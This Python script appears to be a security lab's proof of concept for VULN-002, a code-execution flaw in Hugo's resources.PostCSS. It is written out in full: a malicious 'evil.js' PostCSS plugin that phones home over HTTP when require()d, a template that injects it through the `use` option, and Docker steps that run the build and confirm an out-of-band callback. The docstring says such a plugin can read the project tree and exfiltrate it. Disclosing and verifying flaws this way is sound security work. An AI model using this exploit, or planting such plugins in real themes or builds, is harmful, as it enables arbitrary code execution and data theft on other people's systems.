#!/usr/bin/env python3
"""
VULN-002 — Node code execution via resources.PostCSS `--use` module injection
==============================================================================

VULN-ID     : VULN-002
Title       : PostCSS `use` forwards attacker-chosen module designators that postcss-cli require()s
Vuln file   : targets/hugo/resources/resource_transformers/cssjs/postcss.go:112-131 (free-form --use/--parser/...)
              targets/hugo/config/security/securityConfig.go:181-190 (exec allowlist vets only the binary NAME)
CWE         : CWE-94 (code injection) — sandbox escape past the exec allowlist

The flaw
--------
security.exec.allow is Hugo's containment boundary against untrusted themes, but it only
vets the BINARY NAME (postcss/node are default-allowed). resources.PostCSS forwards a
theme-controlled `use` value to `postcss --use <value>`, and postcss-cli require()s and
EXECUTES it as a Node module. So a theme that ships a .js plugin and calls
`resources.PostCSS (dict "use" "./evil.js")` runs arbitrary Node during the build.

Node --permission is on by default (AllowWrite:[] blocks fs-writes, AllowRead:["."]),
but it does NOT restrict network egress — so the plugin still runs arbitrary JS that reads
the project tree and phones home. This exploit proves code execution via an OOB network
callout from the injected plugin.

What a successful run proves
---------------------------
A theme-supplied Node module named only via the PostCSS `use` option executes during the
build and performs a network request to an attacker-controlled listener — arbitrary Node
code execution past the exec allowlist.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

VULN = "VULN-002"
# Node-24 image (target hugo binary + node 24). Hugo applies `node --permission` by DEFAULT;
# the lab's Debian node 18 rejects that flag, so PostCSS cannot run there at all. Node 24
# supports --permission, so this validates code-exec under Hugo's DEFAULT Node hardening
# (proving the injected plugin runs and still reaches the network despite --permission).
IMAGE = "cvehunterlab_hugo_st10node:latest"
MARKER = "postcss-rce-" + C.rand()


def main() -> int:
    C.banner(VULN, "Node code exec via resources.PostCSS `--use` module injection",
             info="postcss.go forwards --use verbatim; postcss-cli require()s+runs it (exec allowlist checks only the name)",
             target="throwaway `hugo` build (postcss installed into the site)")

    with C.OOBListener(payload=b"ok\n") as oob:
        port = oob.port
        # evil.js: a valid postcss8 plugin whose top-level code phones home. postcss-cli
        # require()s the `use` module, running this immediately (network egress is allowed
        # even under Node --permission).
        evil_js = (
            "const http = require('http');\n"
            f"try {{ http.get('http://127.0.0.1:{port}/{MARKER}', r => r.resume()); }} catch (e) {{}}\n"
            "module.exports = () => ({ postcssPlugin: 'evil', Once() {} });\n"
            "module.exports.postcss = true;\n"
        )
        files = {
            # DEFAULT security config — postcss/node are already in the default exec.allow,
            # so no config change is needed (models default config + a malicious theme).
            "hugo.toml": "baseURL='http://localhost/'\ntitle='h2'\n"
                         "disableKinds=['taxonomy','term','sitemap','rss','404']\n",
            "assets/css/x.css": "a{color:red}\n",
            "evil.js": evil_js,
            # a theme-style template that pipes CSS through PostCSS with the injected plugin
            "layouts/index.html":
                '{{ $c := resources.Get "css/x.css" }}'
                '{{ $r := $c | css.PostCSS (dict "use" "/site/evil.js") }}'
                'built={{ $r.RelPermalink }}\n',
        }
        site = C.make_site(__file__, files)
        C.log("SETUP", f"OOB listener on 127.0.0.1:{port}; evil.js phones home to /{MARKER} when require()d")

        # Precondition: postcss + postcss-cli in the project's node_modules (the operator/theme
        # installed them to use the PostCSS pipeline).
        C.log("SETUP", "npm install postcss postcss-cli into the site (theme's build dependency)")
        rc_npm, out_npm = C.docker_run(
            IMAGE, ["install", "--no-audit", "--no-fund", "postcss@8", "postcss-cli@11"],
            entrypoint="npm", network="host", user=f"{C.UID}:{C.GID}",
            mounts=[f"{site}:/site"], workdir="/site", env={"HOME": "/tmp"}, timeout=300)
        if rc_npm != 0:
            C.log("FAIL", f"npm install failed (rc={rc_npm}):\n{out_npm[-800:]}")
            print(f"==> {VULN}: FAILED — could not install postcss (precondition)")
            return 1
        C.log("INFO", "postcss + postcss-cli installed")

        C.log("STEP", "running the build; resources.PostCSS should require()+run ./evil.js")
        n0 = len(oob.records)
        rc, out, public = C.run_hugo(site, render_to_memory=False, network="host", memory="2g",
                                     timeout=180, image=IMAGE)
        hits = [r for r in oob.records[n0:] if MARKER in r["path"]]
        C.log("INFO", f"build rc={rc}; OOB callouts to /{MARKER}: {len(hits)}")

    with open(os.path.join(os.path.dirname(__file__), "response.txt"), "w") as fh:
        fh.write(f"npm rc={rc_npm}\nbuild rc={rc}\nOOB callouts to /{MARKER}: {len(hits)}\n"
                 f"records: {[r['path'] for r in hits]}\n\nbuild tail:\n{out[-1200:]}")

    if hits:
        C.log("PROOF", f"injected Node plugin executed and phoned home ({len(hits)} callout to /{MARKER})")
        C.log("OK", "exploit confirmed — a module named only via the PostCSS `use` option was require()d "
                    "and executed during the build, making a network request to our listener. Arbitrary "
                    "Node code execution past the exec allowlist (which only vetted the binary name).")
        print(f"==> {VULN}: CONFIRMED — Node code exec via PostCSS --use module injection")
        return 0
    C.log("FAIL", f"no OOB callout observed (build rc={rc}); check build output:\n{out[-800:]}")
    print(f"==> {VULN}: FAILED — plugin did not execute")
    return 1


if __name__ == "__main__":
    sys.exit(main())
